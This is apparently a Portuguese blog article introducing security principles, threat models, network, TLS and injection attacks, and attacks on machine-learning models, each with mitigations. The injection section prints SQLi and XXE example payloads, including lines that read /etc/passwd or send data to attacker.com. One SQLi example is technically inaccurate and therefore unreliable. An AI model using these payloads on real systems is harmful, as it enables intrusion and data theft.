# Introdução à Segurança da Informação: Princípios e Modelos de Ameaças

## Introdução

Bom, aqui começo o meu primeiro artigo em que aprofundo tecnicas de segurança da informação, explorando e integrando o conceito de ataques com equipes centauros (humanos + IA), em que através de teoria de jogos, estabele-se um esquema de recompensas baseados em accesso a recursos, onde quanto mais camadas a equipe adversária atravessa, maior seu ganho, enquanto a equipe de defesa também centauro, ao mitigar, recupera seus pontos perdidos e se prever um comportamento, ganha payoffs enquanto remove da equipe adversária.

No caso, esse sistema de transformers, cada neuronio seria uma tecnologia (IDS, Firewall, Switch, etc) e o modelo matematico de aprendizado de ambas as partes criam vetores (Por exemplo, do lado defensor, há o cruzamento entre IDS e firewall, criando um caminho vetorial, enquanto no atacante, ao quebrar um desses caminhos, conseguem tanto o IDS quanto o firewall, mas irei aprofundar mais adiante.

### 1 Definição de Segurança da Informação

Basicamente toda a teia de defesa de uma rede, em que as conexões formam uma camada que controla, monitora e bloqueia fluxos de dados, operando como uma espécie de "fortaleza interna", podendo ser representada por uma estrutura de grafos.

Muitas vezes essa "fortaleza" pode ser um castelo de cartas, onde um script kiddie executa meia duzia de comandos no Kali e consegue acessar uma rede interna, normalmente em escolas publicas [~~ou do exercito brasileiro~~](https://www.youtube.com/watch?v=783w84FQZh0)~~.~~&#x20;

A pior coisa que pode acontecer com uma empresa é um APT (Advanced Persistent Threat), onde além de serem pessoas realmente qualificadas, o uso de IA pode acelerar ainda mais a capacidade de aprendizado dos invasores, porém com os mecanismos modernos e padronização de segurança, o investimento maciço para esse tipo de ataque normalmente está em nível estatal.

### 1.1 Princípios Fundamentais (Confidencialidade, Integridade, Disponibilidade)

Três pilares que definem uma rede segura, que em cada um há métodos especificos e objetivos em especificos, onde todos, ao mesmo tempo que devem ser independentes, devem ser tratados como unidade, vou abordar brevemente.

**Confidencialidade:** A ideia de que hierarquia de privilégios sobre acesso a informação, normalmente feito em blocos logicos de sistema de arquivos, em que a tabela de alocação define grupos e quem pode acessar aqueles binários, sendo responsabilidade do kernel configurado barrar o acesso indevido.

**Integridade:** A garantia de que não houve adulteração nas informações passadas, sejam elas pacotes de dados, seja através de informação falsa como fake news ou sabotagem através de engenharia social. Normalmente é combatida com protocolos de comunicação e cultura da equipe defensiva.

**Disponibilidade:** O sistema deve estar sempre de pé, onde a estrutura de acesso a dados, permissões e armazenamento esteja disponivel para as pessoas certas e é a partir de estruturas redundantes que se garante isso.

Essa triade é de extrema importância para qualquer empresa que se preze, o que garante que, ao ser abordada individualmente, mas amarrando conceitos logicos através de interação com LLM, impede a pontuação da equipe adversaria.

### 1.2 Evolução das Ameaças e Contexto Atual

Dado a expansão dos datasets, e a liberação de LLM para a comunidade, uma grande brecha de segurança foi criada: "A PORRA DA IA ENSINA TANTO A DEFENDER QUANTO A ATACAR". Antes, a maior preocupação era abrir um link com um pdf que executa um virus, mas hoje, com o avanço da comunicação, ataques de ransomware, malware polimórfico e até espionagem industrial estão muito mais bem desenvolvidos e especializados.

Além do mais, a conectivade insana das pessoas e sensores (IoT, 5G, computação em nuvem,etc) pode-se criar brechas nunca antes vistas, onde varios ataques de 0 day podem acontecer a qualquer momento, além do uso de IA para automatizar ataques e criar exploits adaptados pode dificultar ainda mais essa mitigação e proteção, por isso a integração de modelos matematicos de aprendizados na indústria é de extrema importancia.&#x20;

É engraçado pensar que o que era coisa de nerd virou ativo estratégico a nivel estatal rsrsrs

## 2 Modelos de Ameaças e Arquiteturas de Segurança

Como eu disse anteriormente, pode-se representar a relação de ataque e defesa como uma estrutura de dados que apontam entre si num sentido, em que o payoff é o sistema de recompensa que modula as estratégias usadas por ambos os lados.

### 2.1 Estruturas de Modelagem de Ameaças: STRIDE, DREAD, ATT\&CK Framework

Dado a sofisticação dos ataques, foram criados uns esquemas gigantescos para guiar a mitigação de ataque, dado que assim como o lado atacante evolui, o lado defensivo também, onde se encontram em equilíbrio de Nash, mas resumindo:

**STRIDE:** Cartilha que identifica ameaça por categorias:

* Spoofing, Tampering, Repudiation, Information Disclousere, Denial of Service e Elevation of Privilege.
* O objetivo é mapear e ver como lidar com cada ameaça, classificando e priorizando de acordo com a situação.

**DREAD (Damage, Reproducibility, Exploitability, Affected Users e Discoverability):** é um sistema de pontuação que rankeia o nível de periculosidade de cada ataque, meio que definindo um parametro de medição para o impacto e facilidade de ser explorado

**ATT\&CK Framework**: criado pela MITRE, que é basicamente uma enciclopédia de comportamento de adversários (uma recomendação é treinar LLM's com ela para uso interno pela equipe de segurança). Esse campo de dados mapeia as ações e modus operandis de táticas usadas, desde o reconhecimento até a exfiltração de dados.

### 2.2 Defesas Baseadas em Zero Trust e Redes Defensivas

A ideia é partir da premissa em que ninguém é confiável e potencialmente mal-intencionado, até as entidades dentro da rede. Em vez de abrir o rodo só porque o pessoal está atrás de firewall, é validado cada solicitação, testada credenciais e contexto de ação, funcionando como prisão panoptica. Embora seja caro, em sistemas distribuídos e, principalmente em integração com terceiros, é essencial.

Além disso, redes defensivas são organizadas em camadas interdependentes, buscando segmentar e dificultar o máximo do levantamento do estado de defesa da rede, como o cascateamento de recursos, aplicação de criptografia em função de transferencia de dados, monitoramento de logs e o uso de ML(teoricamente) para identificar anomalias.

### 2.3 Arquiteturas Red Team vs Blue Team vs Purple Team

Normalmente grandes empresas, para garantir a integridade da própria rede, contumam se organizar em equipes especializadas para testar a infraestrutura, podendo ser segmentadas em:

* Red Team: Executa o papel do atacante tentando DDOS, quebra de senhas, bypass de firewall e infiltração na rede.
* Blue Team: Foca na detecção e correção de incidentes, escalonando contra-medidas e analisando padrões.
* Purple Team: Foca em estudar ambos os lados, vendo o que o atacante está fazendo e o que o defensor está configurando, aprendendo no processo, permitindo uma elaboração de segurança de forma colaborativa, levantando tudo que está blindado e o que não está.

## 3 Ataques avançados e Estratégias de Comprometimento

Bom, como dito anteriormente, a pior coisa que se pode acontecer a um negócio que lida com dados é um ataque persistente e direcionado. Podendo ser segmentados por estratégias e formas:

### 3.1 Ataques em Camadas Inferiores (Físico e Link Layer)

Nos níveis físico e de enlace (OSI Layer 1 e 2), diversos vetores de ataque exploram vulnerabilidades associadas a sinais e protocolos de acesso ao meio como dito anteriormente, em que o sistema de recompensas pode ser baseados em teoria de jogos.&#x20;

Exemplos incluem a intercepção de cabos de fibra ótica ou cabeamento metálico, onde invasores podem utilizar acopladores óticos ou dispositivos de “tap” para realizar espionagem passiva, interferência ou sabotagem.&#x20;

Em redes sem fio, ataques como jamming(sobrecarga de frequencia) interferem na disponibilidade, enquanto técnicas de MAC spoofing (o mascaramento para disfarçar o dispositivo invasor) exploram a autenticação limitada em protocolos 802.11. Além disso, a manipulação de frames e beacon frames maliciosos pode provocar desassociação de usuários ou a criação de pontos de acesso falsos (rogue APs, que por sua vez, o atacante cria um "Access Point" falso através de frames ou beacon frames para desassociar alvos da rede), expondo dispositivos a interceptações ou sequestros de sessões.

### 3.2 Side-Channel Attacks (Spectre, Meltdown)

Os ataques de canal lateral, tais como Spectre (explora a execução expeculativa para ler dados de áreas de memória protegida, mesmo sem acesso a elas) e Meltdown (permite que um processo malicioso leia toda a memória do sistema, incluindo dados privilegiados ao contornar as proteções de memória), visam explorar características de execução especulativa e técnicas de otimização de hardware (e.g., pipelines de CPU, branch prediction) permitindo que invasores leiam dados privilegiados a partir de áreas de memória que deveriam estar isoladas, violando a confidencialidade.

Embora demandem conhecimentos avançados de arquitetura de processadores, sua efetividade pode comprometer sistemas virtualizados e servidores em nuvem, pois um único hardware compartilhado pode ser explorado para extrair informações de múltiplas máquinas virtuais em execução simultânea. Além disso, com o uso massivo de LLM, qualquer um pode comprimir a curva de aprendizado e explorar brechas que antes necessitariam de uma alta especialização.

### 3.3 Manipulação de Firmware e Hardware Rootkits

Rootkits em firmware inserem-se em camadas extremamente sensíveis, como BIOS, UEFI ou controladores de dispositivos (e.g., placas de rede, controladores de disco) e uma vez implantados, possuem privilégios praticamente ilimitados, dado que são camadas inicializadas no boot, antes mesmo de qualquer software, dado a independência dessas camadas em relação ao SO, podendo sobreviver a formatações de disco e reinstalações de sistema operacional.&#x20;

Além disso, através desses firmwares, pode-se interceptar tráfego de rede, redirecionar dados ou instalar backdoors sem que o sistema detecte, além de permitir manipular diretamente o hardware, ocultando o rootkit e garantindo persistência.

Em paralelo, hardware malicioso ou manipulado (por exemplo, chips adicionados em placas-mãe durante a cadeia de suprimentos) abre a possibilidade de interceptação de dados ou execução de código não autorizado ainda no estágio de inicialização. Esses ataques exigem contramedidas de verificação de firmware (Secure Boot) e inspeções rigorosas de supply chain.

### 3.4 Ataques na Camada de Rede e Transporte

**BGP Hijacking**

O **Border Gateway Protocol (BGP)** é um protocolo usado para trocar informações de roteamento entre sistemas autônomos na internet. Ele é fundamental para a operação da internet, pois permite que diferentes redes se comuniquem entre si.

O atacante configura um roteador para anunciar rotas falsas para uma rede. Isso pode ser feito manipulando o BGP para fazer com que o tráfego seja redirecionado para um local não autorizado, basicamente um bypass.

O BGP Hijacking consiste em explorar a arquitetura descentralizada do protocolo Border Gateway Protocol para anunciar rotas indevidas, redirecionando o tráfego de forma não autorizada. Isso pode resultar em negação de serviço em larga escala, espionagem de tráfego em trânsito entre grandes blocos de rede e até mesmo adulteração de dados.

Uma medida de proteção pode ser a validação de rotas através de políticas rigorosas, o BGPSPEC que fornece autenticação e integridade das informações de roteamento e o monitoramento continuo do trafego na rede.

#### **DNS Spoofing**

**O DNS** (Domain Name System) é o sistema que traduz nomes de domínio amigáveis (como example.com) em endereços IP (como 192.0.2.1) que os computadores usam para identificar uns aos outros na rede. Quando você digita um nome de domínio no navegador, uma solicitação é enviada a um servidor DNS para resolver esse nome em um endereço IP.

No DNS Spoofing, o invasor corrompe respostas DNS para desviar usuários para endereços falsos, possibilitando phishing ou injeção de malware. A técnica pode envolver envenenamento de cache (DNS cache poisoning ao enviar respostas falsas a um servidor de cache DNS, fazendo armazenar informações incorretas) ou comprometimento de servidores DNS autorizados, impactando a integridade e a confiabilidade do nome de domínio.

Esse tipo de ataque abre portas para **phishing,** redirecionando usuários para sites falsos que se parecem com sites legítimos, onde os atacantes podem coletar informações confidenciais, como credenciais de login e dados financeiros ou i**njeção de malware, r**edirecionando usuários para sites maliciosos que contêm código malicioso, onde os atacantes podem infectar dispositivos com vírus, ransomware e outros tipos de software malicioso.

Uma contra medida eficaz é a implementação de protocolos que autentifica respostas DNS com assinaturas criptografadas, como DNSSEC, monitoramento continuo de tráfego e políticas de cache seguras.

#### **Man-in-the-Middle (MitM)**

Em comunicações não criptografadas, como HTTP, Telnet ou FTP, os binários são transmitidos em texto claro. O atacante pode interceptar o tráfego e ler todas as informações transmitidas, como senhas, e-mails e outros dados sensíveis, podendo ser feita, por exemplo, através de uma rede Wi-Fi pública.

Ataques MitM ocorrem quando um terceiro intercepta e potencialmente altera a comunicação entre duas partes, sem que estas tenham conhecimento. Em protocolos não criptografados, as informações em texto claro podem ser capturadas; já em comunicações criptografadas, o invasor pode tentar explorar brechas como certificados inválidos ou renegociações inseguras de chaves para obter acesso ao conteúdo.

Embora em comunicações criptografadas, como HTTPS, em que os dados são protegidos por criptografia, se um atacante conseguir inserir um certificado inválido ou falso, ele pode se passar por um site legítimo e interceptar a comunicação. Além disso, alguns protocolos permitem a renegociação de chaves de criptografia durante a sessão. Se essa renegociação não for segura, o atacante pode intercalar-se na comunicação durante a troca de chaves e descriptografar o tráfego, por exemplo, pode-se explorar vulnerabilidades em SSL/TLS para realizar um ataque de downgrade, forçando a conexão a usar um protocolo mais fraco e explorável.&#x20;

São basicamente 3 etapas:

1. **Posicionamento na Rede**:
   * **Descrição**: O atacante deve se posicionar entre as duas partes que estão se comunicando. Isso pode ser feito usando técnicas como ARP spoofing (enganando os dispositivos na rede local para pensar que o atacante é o gateway legítimo) ou manipulando roteadores e switches.
2. **Intercepção e Manipulação de Dados**:
   * **Descrição**: Uma vez posicionado, o atacante intercepta os dados transmitidos. Eles podem simplesmente espionar (escutar passivamente) ou alterar os dados antes de retransmiti-los para o destino.
   * **Exemplo**: Modificação de dados em uma transação bancária, alterando o valor ou o destinatário antes de enviar a solicitação ao banco.
3. **Reencaminhamento de Dados**:
   * **Descrição**: O atacante reencaminha os dados interceptados (e possivelmente manipulados) para o destino legítimo, garantindo que a comunicação continue sem levantar suspeitas.
   * **Exemplo**: O usuário envia uma senha para um site; o atacante intercepta, copia a senha e reencaminha a solicitação para o site sem que o usuário perceba a interceptação.

A mitigação pode ser feita através de criptografia ponta a ponta para proteção de dados e o uso de certificados SSL/TLS validos e emitidos por autoridades confiáveis, o uso de chaves seguras e monitoramento, como mudanças de tabelas ARP ou presença de certificados suspeitos

### **Exploração de TLS/SSL (BEAST, POODLE, Heartbleed)**

Vou resumir esses três intens aqui:

* BEAST (Browser Exploit Against SSL/TLS)
  1. **Como Funciona**:
     * BEAST explora uma vulnerabilidade no SSL 3.0 e no TLS 1.0 que permite um ataque de criptografia CBC (Cipher Block Chaining), decriptando dados que naturalmente são ilegiveis.
     * O atacante intercepta e modifica pacotes SSL/TLS enquanto força o navegador a enviar dados específicos para um site alvo, o que pode ocasionar injeção de conteudo macicioso, durante uma comunicação supostamente segura
* POODLE (Padding Oracle On Downgraded Legacy Encryption)
  1. **Como Funciona**:
     * POODLE explora uma vulnerabilidade no SSL 3.0 relacionada ao preenchimento de dados em modos CBC, comprometendo dados supostamente seguros.
     * Forçando a utilização de SSL 3.0, o atacante pode explorar essa falha para decriptar informações.
* Heartbleed
  1. **Como Funciona**:
     * Heartbleed é uma vulnerabilidade no protocolo TLS, especificamente em uma extensão do OpenSSL chamada Heartbeat.
     * Um atacante envia uma solicitação maliciosa ao servidor, fazendo com que ele responda com mais dados do que deveria, vazando partes da memória que podem ser sensíveis, como exposição de chaves privadas, dados de usuários, senhas, o link do porno da Gretch,&#x20;

MAS basicamente uma forma de evitar essa vulnerabilidade é atualizar os softwares e bibliotecas, além de adotar protocolos robustos e de preferencia redundantes.

### 3.5 Ataques em Aplicações e Dados

**Evasão de Firewalls e IDS usando Polimorfismo/Metamorfismo e Ofuscação**

Técnicas de polimorfismo, que a capacidade de um malware de se modificar de modo a alterar sua assinatura estática (sequência de bytes que identifica o malware) a cada nova infecção ou iteração, variantes de malware que alteram sua assinatura estática, dificultando a detecção por soluções baseadas em assinatura como antivírus, que dependem de assinaturas conhecidas para identificar ameaças. Basicamente o uso de algoritmos orgânicos para infecção de sistemas.

O malware contém um motor polimórfico que gera novas versões de seu código a cada execução, por exemplo, um vírus polimórfico pode reordenar suas instruções, utilizar diferentes métodos de criptografia para seus segmentos de código e substituir funções por equivalentes que realizam a mesma tarefa onde cada nova versão tem uma assinatura diferente.

Da mesma forma, ofuscações em pacotes (via fragmentação, encoding de payload ou criptografia customizada) podem iludir sistemas de monitoramento, permitindo que o tráfego hostil se misture a fluxos legítimos.

Um exemplo de motor:

* Seria dividir o payload (carga útil) malicioso em partes menores e enviar esses fragmentos separadamente. O malware é reconstituído no destino para evitar detecção. Uma variante dessa técnica pode ser vista em ataques como **C2 obfuscado via HTTPS**, onde pacotes são quebrados e reconstituídos apenas no host infectado.
* Codificar e criptografar o binário do payload em diferentes formatos, como Base64 para mascarar o conteúdo, criptografar os dados do payload, onde apenas o malware sabe como decifrar o próprio conteúdo, o que já é manjado, porém funcional em alguns casos. MAS tenha em mente que em técnicas modernas, o atacante usa **criptografia híbrida dinâmica** (chave pública gerada em tempo real) para esconder o payload.
* Com um gatilho, ele executa a descriptografia e roda o binário, driblando scanners que analisam o conteúdo, além disso, um malware pode reconhecer quando está rodando dentro de uma sandbox ou ambiente virtual e modificar sua execução para evitar análise. Técnicas como **Time-based Execution** (onde o payload só é ativado após um delay específico) já foram usadas pra burlar detecções automatizadas.

Há algumas formas avançadas de evitar essa falha e proteger de motores polimórficos, como:

* Em vez de buscar assinaturas específicas, pode-se analisar o comportamento dos programas e identificam padrões suspeitos de atividades, como acessos não autorizados à memória ou comportamentos anômalos. No caso, seria necessário a definição de heurísticas por equipes centauros, analisando fluxos de execução e comportamento do processo.
  * Algumas ferramentas como os EDRs modernos (CrowdStrike, SentinelOne) já trabalham com essa abordagem, coletando logs de eventos em tempo real e correlacionando com modelos preditivos.
* Outra forma seria o uso de modelos de aprendizado de máquina, que podem ser treinados para reconhecer comportamentos maliciosos e padrões ocultos em grandes volumes de dados, onde o papel do humano, através de uma transpilação de comandos e logs, e em conjunto com LLM's, pode-se estudar heurísticas não exploradas.
* Porém se você lidar com metamorfismo, que não só altera a assinatura, mas **reescreve completamente o código entre execuções**, trocando opcodes, alterando instruções em runtime e até inserindo código "lixo" pra confundir disassemblers e heurísticas, tu ta fodido kkkkk.

#### **Injeção de Código (SQLi, XXE, RCE)**

A injeção de comandos SQL (SQLi) continua sendo um dos métodos mais comuns para obtenção de acesso não autorizado a bancos de dados, onde a vulnerabilidade permite que um atacante interfira nas consultas que uma aplicação faz ao banco de dados. Isso ocorre quando dados fornecidos pelo usuário são incluídos diretamente em uma consulta SQL sem a devida validação ou sanitização.&#x20;

Explicando de forma simples:

1. **Entrada Maliciosa**:
   * O atacante insere comandos SQL maliciosos em campos de entrada de formulários, como campos de login, caixas de pesquisa ou parâmetros de URL.
   * Exemplos de tecnicas seria:
     * **Blind SQL Injection**
       * O atacante **não vê diretamente a resposta** (ex.: erro ou retorno de dados), então usa **tempo de resposta do servidor** ou **mudanças sutis de comportamento** pra inferir se a consulta foi alterada com sucesso.
       * Exemplo: `IF(1=1, sleep(5), 0)` → Se a resposta demorar 5 segundos, significa que a query foi interpretada.
     * **Second-Order SQL Injection**
       * O payload malicioso **não é executado imediatamente**, mas armazenado no banco e **ativado em uma query futura**.
       * Exemplo: o atacante injeta um payload em um formulário de cadastro e, quando um admin revisa os dados mais tarde, a consulta SQL executa o código malicioso.
     * **Out-of-Band SQL Injection (OOB-SQLi)**
       * O atacante **não recebe resposta direta**, mas usa canais externos (como HTTP requests) pra exfiltrar dados.
       * Exemplo: `UNION SELECT username, password INTO OUTFILE 'http://attacker.com/data.txt'`
2. **Execução da Consulta**:
   * A consulta modificada é executada pelo banco de dados.
   * O ataque pode resultar na divulgação de dados confidenciais, modificação ou exclusão de dados ou até mesmo a execução de comandos administrativos no banco de dados.

Ataques como XXE (XML External Entities) exploram processadores XML mal configurados para exfiltrar arquivos internos ou realizar DoS:

1. **Definição de Entidades Externas**:
   * O atacante inclui entidades XML externas maliciosas em um documento XML.
   *   Exemplo:&#x20;

       * {% code overflow="wrap" %}
         ```xml
         <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
         ```
         {% endcode %}
         * Isso gera um leak direto do conteúdo do arquivo.
       * {% code overflow="wrap" %}
         ```xml
         <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/log?data=file:///etc/passwd">]>
         ```
         {% endcode %}
         * Isso envia dados pro atacante sem o servidor nem percerber


2. **Processamento do XML**:
   * O processador XML, ao interpretar a entidade, tenta acessar recursos externos, como arquivos locais ou URLs remotas.

Já as RCE (Remote Code Execution) permitem que o invasor execute comandos arbitrários no servidor, muitas vezes resultando em controle total da aplicação ou do sistema operacional subjacente.

**Como Funciona?**

1. **Entrada Maliciosa**:
   * O atacante injeta código malicioso em entradas que serão processadas pelo servidor.
   * Exemplo: Injetar comandos de shell em um campo que é passado diretamente para o interpretador de comandos do sistema.
2. **Execução de Código**:
   * O servidor executa o código malicioso, concedendo ao atacante o controle sobre o sistema.

Uma das melhores formas de mitigar essas vulnerabilidades é o uso de bibliotecas de sanitização e ORMs e Query Builders seguros, onde através de redundâncias, você garante que os dados estão definitivamente em formato de texto, não em código, além disso, o uso de ferramentas de IDS básicas podem, num custo-benefício, mitigar, funcionando como camada inicial, além disso, a d**esativação de entidades externas, como** configurar o parser XML, e na medida do possível, usar JSON. Além disso, configurações rigorosas de segurança que minimizem a superfície de ataque, como desativar funcionalidades desnecessárias e usar permissões mínimas são necessárias.

### **3.6 Deepfake Attacks e Engenharia Social Automatizada**

Deepfakes são vídeos, áudios ou imagens que foram alterados ou gerados por técnicas de aprendizado profundo (deep learning) para parecerem realistas. Eles usam redes neurais, como redes generativas adversariais (GANs), para criar conteúdo falsificado, onde através de grandes quantidades de dados (como vídeos ou áudios de uma pessoa), pode-se treinar um modelos de IA. Esses modelos são então capazes de gerar mídia sintética que se parece e soa como a pessoa alvo.

Por exemplo:

1. **Fraudes de Autenticação Biométrica**:
   * Deepfakes podem ser usados para criar vídeos ou áudios falsos que passam por sistemas de autenticação biométrica (como reconhecimento facial ou de voz).
2. **Manipulação de Interações Humanas**:
   * Deepfakes podem ser usados para criar vídeos falsos de pessoas influentes.
3. **Roubo de Credenciais e Fraudes Financeiras**:
   * Combinados com técnicas de engenharia social, deepfakes podem ser usados para convencer vítimas a revelar informações confidenciais ou realizar transferências financeiras.

Na medida do possivel, desconfie e utilize ferramentas (se houver) de detecção de deepfakes para verificar a autenticidade de vídeos e áudios. Empresas como Microsoft e outros provedores de segurança cibernética estão desenvolvendo soluções para identificar deepfakes e abuse da **Autenticação Multi-Fator (MFA)**

Também tem como opção "proof-of-life detection" (exigir que o usuário pisque, fale ou se mova), mas foda que as GANs avançadas já estão burlando isso.

O foda é a porra do equilibrio de Nash, vai levar um tempo até o deepfake ser contornado por ser recente, mas atualmente já estamos lidando com isso:

* **Análise de Artefatos Visuais e Inconsistências**
  * Algoritmos treinados para detectar **padrões anômalos** em iluminação, piscada dos olhos e imperfeições sutis na textura da pele.
  * **Problema**: Modelos avançados de deepfake já estão mitigando isso, gerando vídeos mais realistas.
* **Redes Neurais Adversariais para Detecção**
  * Modelos como **ForensicGAN** foram treinados **especificamente para reconhecer padrões em imagens deepfake**.
  * **Contra-ataque:** Técnicas como **adversarial perturbations** podem ser usadas para criar deepfakes "anti-deteção".
* **Blockchains e Assinatura Digital de Mídia**
  * Algumas empresas estão propondo o uso de **blockchain para verificar a autenticidade de vídeos e áudios**, criando registros imutáveis de quando foram gravados.
  * **Problema**: Isso exige adoção massiva, e a maioria dos vídeos ainda não tem esse tipo de metadado embutido.
*   **Autenticação Multi-Fator (MFA) com Proof-of-Life**

    * O texto menciona **MFA como um mitigador**, o que é uma abordagem correta, mas **a tendência é que métodos tradicionais de autenticação biométrica percam a confiabilidade**.
    * Empresas já estão adotando **análises comportamentais** junto com MFA, verificando **microvariações na digitação, movimentação do mouse e padrões de voz** pra garantir que o usuário é real.



~~Bom, pelo menos o porno vai ser mais interessante com o Full-Body Deepfake(Rule 34, não tem como fugir, não importa onde se esconder)~~

### 3.6 Ataques Baseados em IA e Redes Neurais Adversariais

**Model Extraction & Model Inversion Attacks**

Os ataques de extração de modelo visam **inferir os parâmetros internos** de modelos proprietários. Isso é feito por meio de consultas repetidas a um modelo de aprendizado de máquina hospedado em uma plataforma pública.

**Como Funcionam?**

1. **Consultas Iterativas**:
   * Os invasores fazem um grande número de consultas ao modelo, usando diferentes dados de entrada.
2. **Análise de Saídas**:
   * Com base nas respostas do modelo, eles inferem os parâmetros internos, como pesos e estruturas da rede neural.
3. **Reconstrução do Modelo**:
   * Eventualmente, eles conseguem reconstruir um modelo que se comporta de maneira muito semelhante ao modelo original.

O grande problema é que assim você, através da inferencia de pesos de IA, pode conseguir consultar dados sigilosos internos, como informações de usuarios, rede interna, pegar mulher, e todo o tipo de coisa que desvirtua a pessoa.

**Há algumas formas de mitigar, como a limitação de consultas, monitoramento de uso e a Introdução de Ruído, pois** pequenas quantidades de ruído às respostas pode aumentar o grau de entropia do modelo, evitando num colapso deterministico de parametros.

#### Model Inversion Attacks

**O que são?**

Os ataques de inversão de modelo visam **reconstruir dados de treinamento sensíveis** a partir do comportamento do modelo.

**Como Funcionam?**

1. **Análise do Comportamento do Modelo**:
   * Os invasores observam como o modelo responde a diferentes entradas.
2. **Inferência de Dados de Treinamento**:
   * A partir dessas respostas, eles inferem os atributos de exemplos específicos usados no treinamento do modelo.
3. **Reconstrução de Dados Sensíveis**:
   * Com técnicas avançadas, os invasores conseguem reconstruir dados confidenciais, como imagens, textos ou informações pessoais.

**Impacto:**

* **Privacidade**: Informações pessoais ou sensíveis usadas no treinamento podem ser expostas.
* **Confidencialidade**: Dados proprietários de empresas podem ser comprometidos.

**Prevenção:**

* **Treinamento com Privacidade Diferencial**: Incorporar técnicas que garantam que o modelo não revele informações específicas de exemplos individuais.
* **Sanitização de Dados**: Remover ou modificar informações sensíveis antes do treinamento.
* **Arquiteturas Seguras**: Usar arquiteturas de modelo que minimizam a exposição de informações sensíveis.

#### Resumo

**Model Extraction Attacks** utilizam consultas iterativas para inferir parâmetros internos de modelos proprietários, levando ao roubo de propriedade intelectual e exposição de vulnerabilidades. **Model Inversion Attacks** permitem a reconstrução de dados de treinamento sensíveis, comprometendo a privacidade de usuários e organizações. Prevenção inclui a limitação de consultas, monitoramento de uso, introdução de ruído, treinamento com privacidade diferencial e sanitização de dados.

Se precisar de mais alguma coisa, estou aqui para ajudar!

**Poisoning Attacks e Adversarial Perturbations**

**O que são?**

Os **poisoning attacks** são ataques onde dados maliciosos são introduzidos no conjunto de treinamento de um modelo de aprendizado de máquina. Isso corrompe o modelo, resultando em previsões ou classificações incorretas.

**Como Funcionam?**

1. **Introdução de Dados Maliciosos**:
   * **Descrição**: O atacante insere dados intencionalmente manipulados no conjunto de dados de treinamento do modelo.
   * **Exemplo**: Em um sistema de classificação de spam, o invasor pode adicionar e-mails que são spam, mas rotulados como não-spam, para treinar o modelo de forma inadequada.
2. **Corrompimento da Capacidade do Modelo**:
   * **Descrição**: Esses dados maliciosos fazem com que o modelo aprenda padrões incorretos.
   * **Impacto**: O modelo pode começar a classificar corretamente, ou prever incorretamente, conduzindo a falsas conclusões.
3. **Resultados**:
   * **Direcionamento a Conclusões Falsas**: O modelo pode ser treinado para fazer previsões incorretas sobre certos inputs.
   * **Redução da Acurácia Geral**: A capacidade do modelo de fazer previsões precisas em geral é diminuída.

**Exemplos:**

* **Falsos Positivos/Negativos**: O modelo pode errar na identificação de um ataque cibernético ou na detecção de fraudes financeiras.
* **Manipulação de Recomendações**: Em sistemas de recomendação, produtos não relevantes podem ser recomendados aos usuários.

#### Adversarial Perturbations

**O que são?**

**Adversarial perturbations** são pequenas alterações em entradas legítimas que são geralmente imperceptíveis a olho nu, mas suficientes para enganar modelos de visão computacional ou processamento de linguagem natural.

**Como Funcionam?**

1. **Pequenas Alterações na Entrada**:
   * **Descrição**: O atacante faz minúsculas modificações na entrada de dados que não são perceptíveis para um ser humano.
   * **Exemplo**: Em uma imagem, isso pode envolver a alteração de pixels individuais para enganar um modelo de reconhecimento de imagem.
2. **Engano do Modelo**:
   * **Descrição**: Essas alterações, embora pequenas, fazem com que o modelo interprete a entrada de maneira completamente diferente.
   * **Impacto**: O modelo pode fazer classificações ou previsões completamente erradas.
3. **Exposição de Falhas Críticas**:
   * **Descrição**: Através dessas alterações, as falhas nos modelos de aprendizado de máquina são expostas.
   * **Impacto**: Isso pode comprometer sistemas de segurança automatizados que dependem desses modelos para detecção e mitigação de ameaças.

**Exemplos:**

* **Imagem**: Uma imagem de um gato pode ser alterada imperceptivelmente para ser classificada erroneamente como um cachorro.
* **Texto**: Mudanças sutis em um texto podem fazer um modelo de processamento de linguagem natural interpretar um comando inofensivo como malicioso.

#### Prevenção e Mitigação

1. **Treinamento Robusto**:
   * **Descrição**: Inclui técnicas para tornar o modelo robusto contra esses tipos de ataques.
   * **Método**: Adicionar ruído durante o treinamento ou usar técnicas de treinamento adversarial.
2. **Monitoramento Contínuo**:
   * **Descrição**: Monitorar os dados de entrada em tempo real para detectar padrões suspeitos.
   * **Método**: Implementação de sistemas de detecção de anomalias.
3. **Validação Cruzada**:
   * **Descrição**: Usar múltiplos modelos e comparar seus resultados para detectar incoerências.
   * **Método**: Se modelos diferentes começarem a divergir significativamente, isso pode ser um sinal de ataque.





